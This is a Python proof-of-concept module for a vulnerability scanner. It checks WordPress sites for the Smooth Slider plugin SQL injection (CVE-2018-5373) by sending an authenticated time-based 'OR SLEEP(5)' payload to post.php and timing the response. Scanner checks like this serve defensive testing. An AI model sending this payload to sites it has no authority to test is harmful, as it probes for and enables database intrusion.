# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'CNVD-2018-01281' # 平台漏洞编号
    name = 'WordPress Smooth Slider插件SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2018-01-18'  # 漏洞公布时间
    desc = '''
    WordPress Smooth Slider插件2.8.6及之前版本中的‘$wpdb->get_var()’函数存在SQL注入漏洞。远程攻击者可借助smooth-slider.php文件利用该漏洞提升权限或获取和更改数据库内容。
    ''' # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-01281' #
    cnvd_id = 'CNVD-2018-01281' # cnvd漏洞编号
    cve_id = 'CVE-2018-5373 '  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = 'WordPress Smooth Slider <=2.8.6'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2787bb4d-d26f-4066-a2bb-9fe1bd8f0371' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            
            headers = {
                'Cookie':self.get_option('cookie'),
                'Content-Type':'application/x-www-form-urlencoded'
            }
            
            payload1 = "/wp-admin/post.php?post=1&action=edit&source_lang=1&trid=22"
            payload2 = "/wp-admin/post.php?post=1&action=edit&source_lang=1&trid=22 OR SLEEP(5)"  

            vul_url1 = arg + payload1
            vul_url2 = arg + payload2

            headers = {
                'Content-Type':'application/x-www-form-urlencoded',
                'Cookie':self.get_option('cookie')
            }

            # 开始记录请求时间
            start_time = time.time()
            response1 = requests.get(vul_url1,headers=headers)
            # 记录正常请求并收到响应的时间
            end_time_1 = time.time()


            # 记录延时sleep后的时间
            response2 = requests.get(vul_url2,headers=headers)
            end_time_2 = time.time()
            self.output.info("正在构造SQL注入测试语句")
            # 计算时间差
            delta1 = end_time_1 - start_time
            delta2 = end_time_2 - end_time_1

            if (delta2 - delta1) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()